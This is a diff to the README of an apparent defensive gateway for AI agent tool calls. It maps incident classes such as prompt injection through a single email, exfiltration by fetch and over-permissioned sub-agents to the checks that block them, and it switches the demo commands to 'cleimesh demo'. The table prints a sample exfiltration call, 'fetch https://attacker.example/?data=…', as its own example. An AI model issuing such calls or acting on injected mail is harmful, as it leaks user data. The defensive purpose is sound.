@@ -50,15 +50,17 @@ the SSRF or the rendering race — it gates the **action** the attack needs.
 
 | Incident class (2026) | The damaging tool call | CleiMesh refuses it by | Demo |
 |---|---|---|---|
-| Over-authorized spend | `pay` past the cap / wrong payee | signed allowance (cap, payee, count) | `--example payments` |
-| One-email agent takeover (Manus) | `send` / `fetch` after reading injected mail | taint follows the delegation chain | `--example taint` |
-| Exfiltration by fetch (Copilot flaws) | `fetch https://attacker.example/?data=…` | `host_in` egress allowlist (at the gateway) | `--example egress` |
-| Over-permissioned handoff | a sub-agent acting beyond its grant | attenuating token — narrows only | `--example payments` / `taint` |
+| Over-authorized spend | `pay` past the cap / wrong payee | signed allowance (cap, payee, count) | `cleimesh demo payments` |
+| One-email agent takeover (Manus) | `send` / `fetch` after reading injected mail | taint follows the delegation chain | `cleimesh demo taint` |
+| Exfiltration by fetch (Copilot flaws) | `fetch https://attacker.example/?data=…` | `host_in` egress allowlist (at the gateway) | `cleimesh demo egress` |
+| Over-permissioned handoff | a sub-agent acting beyond its grant | attenuating token — narrows only | `cleimesh demo payments` / `taint` |
+
+Straight from the installed binary, no clone (each runs a real wrap over a toy server):
 
 ```
-cargo run -p cleimesh-cli --example payments
-cargo run -p cleimesh-cli --example taint
-cargo run -p cleimesh-cli --example egress
+cleimesh demo taint
+cleimesh demo payments
+cleimesh demo egress
 ```
 
 ## Caveats
